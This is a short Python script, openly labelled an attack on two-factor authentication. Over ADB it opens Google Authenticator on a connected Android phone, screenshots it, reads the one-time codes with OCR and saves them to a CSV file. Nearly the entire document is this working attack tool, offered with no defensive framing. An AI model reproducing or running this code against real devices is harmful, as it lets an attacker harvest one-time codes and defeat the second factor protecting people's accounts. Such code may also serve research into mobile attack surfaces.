### "Attack On 2FA" source code

import os
import time
import subprocess
import numpy as np
import pytesseract
import cv2
import csv

### Variables

ADB_BINARY = ""
TARGETS = []

class Device:
	def __init__(self, device=""):
		self.adb_command = ADB_BINARY
		if device == "":
			devices_connected=subprocess.Popen('adb devices', stdout=subprocess.PIPE, shell=True)
			(process_output,  error) = devices_connected.communicate()
			for i in str(process_output).split("\\n"):
				if "\\tdevice" in i:
					print("Using " + i.split("\\tdevice")[0])
					self.Device=i.split("\\tdevice")[0]
	def screenshot(self):
		print("Taking screenshot...")
		screenshot_command=subprocess.Popen('adb -s ' + self.Device + ' shell screencap -p', stdout=subprocess.PIPE, shell=True)
		(process_output,  error) = screenshot_command.communicate()
		numpyarr = np.frombuffer(process_output, np.uint8)
		img_np = cv2.imdecode(numpyarr, cv2.IMREAD_COLOR)
		return img_np
	def start_target_app(self):
		print("Calling app...")
		subprocess.call('adb -s ' + self.Device + ' shell am start com.google.android.apps.authenticator2/com.google.android.apps.authenticator.AuthenticatorActivity', stdout=subprocess.PIPE, shell=True)
		time.sleep(2)
test_device = Device()
config = ('-l eng --oem 2 --psm 3')
test_device.start_target_app()
im = test_device.screenshot()
text = pytesseract.image_to_string(im, config=config)
with open('2fa_codes.csv', 'w') as csvfile:
	writer = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
	for i in text.split('\n'):
		if len(i.split(" ")) == 2:
			try:
				if int(i.split(" ")[0]) and int(i.split(" ")[1]):
					writer.writerow(i.replace(" ",""))
					print(i)
			except ValueError:
				pass
